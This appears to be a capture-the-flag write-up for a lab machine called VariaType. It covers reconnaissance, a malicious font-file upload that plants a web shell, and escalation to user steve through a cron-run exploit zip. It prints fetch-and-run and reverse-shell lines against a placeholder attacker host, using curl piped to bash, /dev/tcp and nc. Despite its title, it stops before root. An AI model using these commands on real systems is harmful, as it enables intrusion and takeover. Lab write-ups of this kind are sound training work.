# VariaType — Full Report (User & Root)

## Overview

The **VariaType** system contains multiple vulnerabilities in a web application related to file processing, leading to:

- Remote Code Execution (RCE)
- Privilege escalation via automated processing
- Full user and root compromise

---

## 1. Reconnaissance

```bash
nmap -sC -sV -p- <TARGET_IP>
```

# Results
- 22/tcp → SSH
- 80/tcp → HTTP (nginx)

- Conclusion: The primary attack surface is the web application.


## 2. Web Enumeration
```bash 
echo "<TARGET_IP> variatype.htb" | sudo tee -a /etc/hosts
```
```bash
gobuster dir -u http://variatype.htb -w /usr/share/wordlists/dirb/common.txt
```
# Findings
- /services

## 3. Virtual Host Discovery
```bash
ffuf -u http://variatype.htb \
-H "Host: FUZZ.variatype.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-mc 200
```
# Result
- portal.variatype.htb [Status: 200]
  
```bash
echo "<TARGET_IP> portal.variatype.htb" | sudo tee -a /etc/hosts
```
## 4. File Upload Exploitation

# Create malicious file
``` bash
nano malicious.designspace
```
# Create dummy font files
```bash
echo "dummy" > source-light.ttf
```
```bash
echo "dummy" > source-regular.ttf
```
# Upload exploit
```bahs
curl -X POST http://variatype.htb/tools/variable-font-generator/process \
  -F "designspace=@malicious.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf"
```

## 5. Remote Code Execution

- http://portal.variatype.htb/files/shell.php?cmd=id

# Result

- uid=33(www-data)


## 6. Reverse Shell

# Listener
``` bash
rlwrap nc -lvnp 4444
```
# Trigger
- http://portal.variatype.htb/files/shell.php?cmd=curl+<ATTACKER_IP>:8080/rev.sh|bash

# Result
- www-data shell obtained

## 7. Privilege Escalation to User (steve)

# Generate payload
```bash
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1" | base64
```
# Create exploit
``` bash
nano /tmp/make_exploit.py
```
```bash
python3 /tmp/make_exploit.py
```
# Host file
```bash
cd /tmp
```
``` bash
python3 -m http.server 8080
```
# Transfer exploit
```bash
curl http://<ATTACKER_IP>:8080/exploit.zip -o /tmp/exploit.zip
mv /tmp/exploit.zip /var/www/portal.variatype.htb/public/files/
```
# Listener
```bash
rlwrap nc -lvnp 5555
```
# Result (after cron execution)
- steve@variatype

































